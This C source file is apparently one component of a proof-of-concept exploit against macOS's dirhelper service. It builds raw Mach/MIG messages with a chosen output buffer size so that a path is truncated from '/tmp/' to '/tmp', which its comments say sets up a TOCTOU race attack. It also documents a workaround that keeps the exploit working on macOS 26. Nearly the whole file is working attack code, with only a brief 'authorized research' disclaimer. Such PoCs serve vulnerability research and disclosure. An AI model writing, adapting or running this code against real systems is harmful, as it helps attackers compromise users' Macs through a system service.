/*
 * dirhelper_client.c - Glarus PoC Component
 * 
 * MIG client for macOS dirhelper service with macOS 26+ compatibility.
 * 
 * This component triggers the string truncation vulnerability in dirhelper
 * by sending a carefully crafted buffer size that causes the path to be
 * truncated from "/Data/tmp/" to "/Data/tmp" (missing trailing slash).
 * 
 * macOS 26 Compatibility Note:
 * Uses mig_get_reply_port() instead of manual port allocation to satisfy
 * REQUIRE_REPLY_PORT_SEMANTICS enforcement introduced in macOS 26.
 * 
 * Compilation:
 *   clang -o dirhelper_client -framework Foundation dirhelper_client.c
 * 
 * Usage:
 *   ./dirhelper_client <bundle_id> <type> <buffer_size>
 * 
 * Copyright (c) 2025 Golden Helm Securities
 * For authorized security research only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <pwd.h>
#include <mach/mach.h>
#include <mach/mig.h>
#include <servers/bootstrap.h>

/*
 * Constants
 */
#define DIRHELPER_MIG_ID          0xB872      /* MIG message ID for dirhelper */
#define DIRHELPER_SERVICE_NAME    "com.apple.bsd.dirhelper"
#define DIRHELPER_TYPE_CONTAINER  1           /* Request type: container temp dir */
#define DIRHELPER_TYPE_CACHE      2           /* Request type: cache directory */
#define DEFAULT_BUFFER_SIZE       1024
#define ALIGN4(x)                 (((x) + 3) & ~3)

/*
 * MIG Request Message Structure
 * 
 * This structure matches the dirhelper MIG interface:
 * - type: 1 for container directory, 2 for cache directory
 * - flags: Request flags (typically 1)
 * - path_length: Length of the bundle identifier string
 * - After this header: bundle_id string (null-terminated, padded to 4 bytes)
 * - After string: output_buffer_size (uint32_t) - THIS CONTROLS TRUNCATION
 */
typedef struct {
    mach_msg_header_t header;
    uint32_t ndr_word1;        /* NDR format descriptor */
    uint32_t ndr_word2;
    uint32_t type;             /* 1 = container, 2 = cache */
    uint32_t flags;            /* Request flags */
    uint32_t pad;              /* Padding for alignment */
    uint32_t path_length;      /* Length of bundle ID string */
} dirhelper_request_base_t;

/*
 * MIG Reply Message Structure
 */
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    uint32_t ndr_word1;
    uint32_t ndr_word2;
    uint32_t return_code;
    uint32_t path_offset;
    char path_data[2048];      /* Returned path from dirhelper */
} dirhelper_reply_t;

/*
 * Print Mach error with description
 */
static void print_error(const char *msg, kern_return_t kr) {
    fprintf(stderr, "ERROR: %s: %s (0x%x)\n", msg, mach_error_string(kr), kr);
}

/*
 * Send dirhelper request with specified buffer size
 * 
 * The key to triggering the vulnerability is the output_buffer_size parameter.
 * Setting this to exactly (container_path_length + 5) causes strlcat() to
 * truncate "/tmp/" to "/tmp" because there's only room for 4 characters
 * plus the null terminator.
 * 
 * Returns: 0 on success, non-zero on failure
 */
int call_dirhelper(const char *bundle_id, int type, uint32_t output_buffer_size) {
    kern_return_t kr;
    mach_port_t service_port = MACH_PORT_NULL;
    mach_port_t reply_port = MACH_PORT_NULL;
    void *msg_buffer = NULL;
    void *reply_buffer = NULL;
    int result = 1;
    
    /* Look up dirhelper service via bootstrap */
    kr = bootstrap_look_up(bootstrap_port, DIRHELPER_SERVICE_NAME, &service_port);
    if (kr != KERN_SUCCESS) {
        print_error("bootstrap_look_up", kr);
        goto cleanup;
    }
    
    /*
     * CRITICAL: macOS 26+ Reply Port Handling
     * 
     * macOS 26 introduced REQUIRE_REPLY_PORT_SEMANTICS which enforces that
     * reply ports must have specific kernel-level attributes. Using
     * mach_port_allocate() directly results in process termination.
     * 
     * Solution: Use mig_get_reply_port() which returns a properly configured
     * MIG reply port from the thread-local cache.
     */
    reply_port = mig_get_reply_port();
    if (reply_port == MACH_PORT_NULL) {
        fprintf(stderr, "ERROR: mig_get_reply_port() failed\n");
        goto cleanup;
    }
    
    /* Calculate message size */
    size_t path_len = strlen(bundle_id) + 1;
    size_t path_len_padded = ALIGN4(path_len);
    size_t msg_size = sizeof(dirhelper_request_base_t) + path_len_padded + sizeof(uint32_t);
    
    /* Allocate and initialize message buffer */
    msg_buffer = calloc(1, msg_size);
    if (!msg_buffer) {
        fprintf(stderr, "ERROR: Failed to allocate message buffer\n");
        goto cleanup;
    }
    
    /* Set up Mach message header */
    mach_msg_header_t *header = (mach_msg_header_t *)msg_buffer;
    header->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    header->msgh_size = (mach_msg_size_t)msg_size;
    header->msgh_remote_port = service_port;
    header->msgh_local_port = reply_port;
    header->msgh_voucher_port = MACH_PORT_NULL;
    header->msgh_id = DIRHELPER_MIG_ID;
    
    /* Set up request body */
    dirhelper_request_base_t *req = (dirhelper_request_base_t *)msg_buffer;
    req->ndr_word1 = 0x00000000;  /* NDR format */
    req->ndr_word2 = 0x00000001;
    req->type = type;
    req->flags = 1;
    req->pad = 0;
    req->path_length = (uint32_t)path_len;
    
    /* Copy bundle identifier */
    char *path_ptr = (char *)msg_buffer + sizeof(dirhelper_request_base_t);
    memcpy(path_ptr, bundle_id, path_len);
    
    /* 
     * Set output buffer size - THIS IS THE VULNERABILITY TRIGGER
     * 
     * By setting this to (container_path_length + 5), we cause strlcat()
     * to truncate "/tmp/" to "/tmp", enabling the TOCTOU attack.
     */
    uint32_t *out_buf_size_ptr = (uint32_t *)(path_ptr + path_len_padded);
    *out_buf_size_ptr = output_buffer_size;
    
    /* Allocate reply buffer */
    size_t reply_size = sizeof(dirhelper_reply_t);
    reply_buffer = calloc(1, reply_size);
    if (!reply_buffer) {
        fprintf(stderr, "ERROR: Failed to allocate reply buffer\n");
        goto cleanup;
    }
    
    /* Send message to dirhelper */
    kr = mach_msg((mach_msg_header_t *)msg_buffer, MACH_SEND_MSG,
                  (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL,
                  MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if (kr != KERN_SUCCESS) {
        print_error("mach_msg (send)", kr);
        goto cleanup;
    }
    
    /* Receive reply */
    kr = mach_msg((mach_msg_header_t *)reply_buffer, MACH_RCV_MSG,
                  0, (mach_msg_size_t)reply_size, reply_port,
                  MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if (kr != KERN_SUCCESS) {
        print_error("mach_msg (receive)", kr);
        goto cleanup;
    }
    
    /* Parse reply */
    dirhelper_reply_t *reply = (dirhelper_reply_t *)reply_buffer;
    
    if (reply->return_code == 0) {
        /* Find path in reply (may be at different offsets) */
        char *reply_path = NULL;
        if (reply->path_data[0] != '\0') {
            reply_path = reply->path_data;
        } else {
            /* Search for path starting with '/' */
            char *search_start = (char *)reply + 32;
            size_t search_len = reply->header.msgh_size - 32;
            for (size_t i = 0; i < search_len && i < sizeof(reply->path_data); i++) {
                if (search_start[i] == '/') {
                    reply_path = &search_start[i];
                    break;
                }
            }
        }
        
        if (reply_path && reply_path[0] != '\0') {
            size_t len = strlen(reply_path);
            /* Check if truncation occurred (no trailing slash) */
            if (len > 0 && reply_path[len-1] != '/') {
                /* Truncation successful - race attack is viable */
            }
        }
        result = 0;  /* Request succeeded */
    }
    
cleanup:
    if (msg_buffer) free(msg_buffer);
    if (reply_buffer) {
        mach_msg_destroy((mach_msg_header_t *)reply_buffer);
        free(reply_buffer);
    }
    /* NOTE: Do NOT deallocate MIG reply port - it's cached and reused */
    
    return result;
}

/*
 * Main entry point
 */
int main(int argc, char *argv[]) {
    const char *bundle_id = "com.glarus.poc";
    int type = DIRHELPER_TYPE_CONTAINER;
    uint32_t buffer_size = DEFAULT_BUFFER_SIZE;
    
    if (argc > 1) bundle_id = argv[1];
    if (argc > 2) type = atoi(argv[2]);
    if (argc > 3) buffer_size = (uint32_t)atoi(argv[3]);
    
    return call_dirhelper(bundle_id, type, buffer_size);
}
